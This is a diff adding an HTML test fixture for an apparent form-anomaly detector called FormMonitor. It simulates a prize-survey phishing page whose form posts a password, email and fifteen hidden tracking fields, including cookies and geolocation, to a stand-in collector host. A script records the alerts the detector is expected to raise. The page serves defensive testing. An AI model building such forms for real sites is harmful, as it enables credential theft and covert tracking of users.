@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Survey - Win a Prize!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .warning {
+      background: #ff9800;
+      color: white;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .survey-form {
+      border: 1px solid #ccc;
+      padding: 20px;
+      border-radius: 5px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #ff9800;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #f57c00;
+    }
+  </style>
+</head>
+<body>
+  <div class="warning">
+    <strong>⚠️ TEST DATA HARVESTING PAGE ⚠️</strong><br>
+    Simulated malicious form with excessive hidden fields
+  </div>
+
+  <div class="survey-form">
+    <h1>Win a $1000 Gift Card!</h1>
+    <p>Complete this short survey to enter our prize draw!</p>
+
+    <!-- MALICIOUS: Excessive data collection + cross-origin submission -->
+    <form id="harvesting-form" action="https://data-collector.xyz/harvest" method="POST">
+      <!-- Visible fields (to appear legitimate) -->
+      <label for="name">Full Name:</label>
+      <input type="text" id="name" name="name" value="John Doe" required>
+
+      <label for="email">Email Address:</label>
+      <input type="email" id="email" name="email" value="john@example.com" required>
+
+      <label for="password">Create Account Password:</label>
+      <input type="password" id="password" name="password" value="mypassword" required>
+
+      <label for="phone">Phone Number:</label>
+      <input type="tel" id="phone" name="phone" value="555-1234">
+
+      <!-- SUSPICIOUS: Excessive hidden fields for data harvesting -->
+      <input type="hidden" name="tracking_id" value="track_abc123">
+      <input type="hidden" name="referrer_url" value="https://google.com/search?q=free+prize">
+      <input type="hidden" name="device_fingerprint" value="canvas_hash_456">
+      <input type="hidden" name="screen_resolution" value="1920x1080">
+      <input type="hidden" name="timezone" value="America/New_York">
+      <input type="hidden" name="browser_plugins" value="plugin1,plugin2,plugin3">
+      <input type="hidden" name="local_storage_data" value="cached_user_data">
+      <input type="hidden" name="session_history" value="site1,site2,site3">
+      <input type="hidden" name="cookie_data" value="all_cookies_serialized">
+      <input type="hidden" name="ip_address" value="192.168.1.100">
+      <input type="hidden" name="geolocation" value="40.7128,-74.0060">
+      <input type="hidden" name="user_agent" value="Mozilla/5.0...">
+      <input type="hidden" name="language" value="en-US">
+      <input type="hidden" name="platform" value="Win32">
+      <input type="hidden" name="do_not_track" value="false">
+
+      <button type="submit" id="submit-btn">Enter Prize Draw!</button>
+    </form>
+  </div>
+
+  <div id="test-status" style="margin-top: 20px; padding: 10px; background: #ffe0e0; border: 2px solid #ff0000; border-radius: 3px;">
+    <strong>FormMonitor Anomaly Detection:</strong> <span id="status-text">Analyzing...</span>
+  </div>
+
+  <script>
+    // FormMonitor test data
+    const form = document.getElementById('harvesting-form');
+    const documentOrigin = window.location.origin || 'data:';
+    const actionOrigin = new URL(form.action).origin;
+
+    const allFields = form.querySelectorAll('input');
+    const visibleFields = form.querySelectorAll('input:not([type="hidden"])');
+    const hiddenFields = form.querySelectorAll('input[type="hidden"]');
+    const passwordFields = form.querySelectorAll('input[type="password"]');
+
+    const hiddenRatio = hiddenFields.length / allFields.length;
+
+    window.__formMonitorTestData = {
+      testName: 'data-harvesting',
+      documentUrl: window.location.href,
+      actionUrl: form.action,
+      formOrigin: documentOrigin,
+      actionOrigin: actionOrigin,
+      method: 'POST',
+      hasPasswordField: passwordFields.length > 0,
+      hasEmailField: true,
+      isCrossOrigin: true,
+      totalFields: allFields.length,
+      visibleFields: visibleFields.length,
+      hiddenFields: hiddenFields.length,
+      hiddenRatio: hiddenRatio,
+      expectedAlert: 'credential_exfiltration',
+      expectedSeverity: 'critical', // Elevated due to anomalies
+      expectedAnomalyIndicators: [
+        `High hidden field ratio (${(hiddenRatio * 100).toFixed(1)}%)`,
+        'Excessive data collection detected'
+      ],
+      expectedAnomalyScore: hiddenRatio, // > 0.7
+      note: 'Data harvesting form with excessive hidden fields should trigger high anomaly score'
+    };
+
+    document.getElementById('status-text').textContent =
+      `ANOMALIES DETECTED: ${hiddenFields.length}/${allFields.length} hidden fields (${(hiddenRatio * 100).toFixed(0)}%), ` +
+      `Cross-origin: YES, Password: YES`;
+  </script>
+</body>
+</html>
